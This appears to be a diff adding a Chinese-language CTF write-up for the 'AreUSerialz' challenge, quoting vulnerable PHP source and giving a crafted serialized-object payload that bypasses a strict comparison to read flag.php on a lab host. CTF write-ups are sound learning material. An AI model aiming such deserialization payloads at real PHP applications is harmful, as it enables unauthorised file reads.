@@ -425,5 +425,62 @@ else{
 }Please input first
 ```
 md5直接传俩数组过。numeric直接后面跟字符串过。拿到flag。
-
+[网鼎杯 2020 青龙组]AreUSerialz
+直接进入，看到源码：
+```php
+<?php  
+include("flag.php");  
+highlight_file(__FILE__);  
+class FileHandler {  
+    protected $op;  
+    protected $filename;  
+    protected $content;  
+    function __construct() {        $op = "1";        $filename = "/tmp/tmpfile";        $content = "Hello World!";        $this->process();  
+    }  
+    public function process() {  
+        if($this->op == "1") {            $this->write();  
+        } else if($this->op == "2") {            $res = $this->read();            $this->output($res);  
+        } else {            $this->output("Bad Hacker!");  
+        }  
+    }  
+    private function write() {  
+        if(isset($this->filename) && isset($this->content)) {  
+            if(strlen((string)$this->content) > 100) {                $this->output("Too long!");  
+                die();  
+            }            $res = file_put_contents($this->filename, $this->content);  
+            if($res) $this->output("Successful!");  
+            else $this->output("Failed!");  
+        } else {            $this->output("Failed!");  
+        }  
+    }  
+    private function read() {        $res = "";  
+        if(isset($this->filename)) {            $res = file_get_contents($this->filename);  
+        }  
+        return $res;  
+    }  
+    private function output($s) {  
+        echo "[Result]: <br>";  
+        echo $s;  
+    }  
+    function __destruct() {  
+        if($this->op === "2")            $this->op = "1";        $this->content = "";        $this->process();  
+    }  
+}   
+function is_valid($s) {  
+    for($i = 0; $i < strlen($s); $i++)  
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  
+            return false;  
+    return true;  
+}  
+if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];  
+    if(is_valid($str)) {        $obj = unserialize($str);  
+    }  
+}
+?>
+```
+在destruct里有个sd强等于，把字符2改成数字2或者字符02都行。
+protected改public公有，写入文件名，改成2读取模式，序列化，构造payload:
+`3f2919da-a1a0-4b91-b735-34a8e04db922.node4.buuoj.cn:81/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
+直接在源码中拿到flag。
+我真想复杂了这题。。。。。。。。
 
